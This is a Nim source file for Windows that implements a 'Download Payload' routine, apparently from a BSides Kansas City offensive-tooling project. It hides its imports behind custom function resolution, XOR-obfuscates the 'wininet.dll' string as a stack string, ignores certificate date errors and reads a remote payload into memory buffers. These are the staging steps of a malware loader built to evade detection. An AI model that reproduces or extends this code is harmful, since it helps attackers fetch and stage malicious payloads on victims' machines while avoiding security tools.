import winim
import winim/inc/wininet

import utils/[enc, gmh, goto, gpa, hash, stackstr, stdio]

#[ Download Payload ]#
proc getPayloadFromUrlA*(sUrl: cstring, pBuffer: var pointer, sPayloadSize: var int): bool =
  var 
    hKernel32     = gmh("KERNEL32.DLL")
    pLoadLibraryA = gpa(hKernel32, "LoadLibraryA", LoadLibraryA)
    pLocalAlloc   = gpa(hKernel32, "LocalAlloc", LocalAlloc)
    pLocalReAlloc = gpa(hKernel32, "LocalReAlloc", LocalReAlloc)
    pLocalFree    = gpa(hKernel32, "LocalFree", LocalFree)
    sWininet {.stackStringA.} = "\x15:'-+6?mP^\\"
    key      {.stackStringA.} = "BSIDESKC420"
  xorStackString(sWininet, key)
  var
    hWininet             = pLoadLibraryA(cast[cstring](sWininet[0].addr))
    pInternetOpenA       = gpa(hWininet, "InternetOpenA", InternetOpenA)
    pInternetOpenUrlA    = gpa(hWininet, "InternetOpenUrlA", InternetOpenUrlA)
    pInternetReadFile    = gpa(hWininet, "InternetReadFile", InternetReadFile)
    pInternetCloseHandle = gpa(hWininet, "InternetCloseHandle", InternetCloseHandle)
    pInternetSetOptionA  = gpa(hWininet, "InternetSetOptionA", InternetSetOptionA)
    bState: bool = true
    hInternet, hInternetFile: HINTERNET
    dwBytesRead: DWORD
    pTmpBytes, pBytes: PBYTE
    sSize: int

  hInternet = pInternetOpenA(NULL, cast[DWORD](NULL), NULL, NULL, cast[DWORD](NULL))
  if (hInternet == NULL): 
    PRINTA("[!] 1 Failed: %i\n", GetLastError())
    bState = false; goto endOfFunction
  
  hInternetFile = pInternetOpenUrlA(
    hInternet, sUrl, NULL, cast[DWORD](NULL),
    INTERNET_FLAG_HYPERLINK or INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
    cast[DWORD_PTR](NULL)
  )
  if hInternetFile == NULL:
    PRINTA("[!] 2 Failed: %i\n", GetLastError())
    bState = false; goto endOfFunction

  pTmpBytes = cast[PBYTE](pLocalAlloc(LPTR, 1024))
  if cast[uint](pTmpBytes) == 0:
    PRINTA("[!] 3 Failed: %i\n", GetLastError())
    bState = false; goto endOfFunction
  
  while true:
    if pInternetReadFile(hInternetFile, pTmpBytes, 1024, dwBytesRead.addr) == 0:
      PRINTA("[!] 4 Failed: %i\n", GetLastError())
      bState = false; goto endOfFunction
    sSize += dwBytesRead.int

    if cast[uint](pBytes) == 0:
      pBytes = cast[PBYTE](pLocalAlloc(LPTR, dwBytesRead))
    else:
      pBytes = cast[PBYTE](pLocalReAlloc(cast[HLOCAL](pBytes), sSize, LMEM_MOVEABLE or LMEM_ZEROINIT))
    
    if cast[uint](pBytes) == 0:
      bState = false; goto endOfFunction

    copyMem(
      cast[pointer](cast[uint](pBytes) + (sSize.uint - dwBytesRead.uint)),
      pTmpBytes,
      dwBytesRead.int
    ) 
    zeroMem(pTmpBytes, dwBytesRead)
    if (dwBytesRead < 1024):
      break

  pBuffer = cast[pointer](pBytes)
  sPayloadSize = sSize
  
  bstate = true

  label endOfFunction:
    discard pInternetCloseHandle(hInternet)
    discard pInternetCloseHandle(hInternetFile)
    discard pInternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0)
    if cast[uint](pTmpBytes) != 0: 
      discard pLocalFree(cast[HLOCAL](pTmpBytes))
    return bState
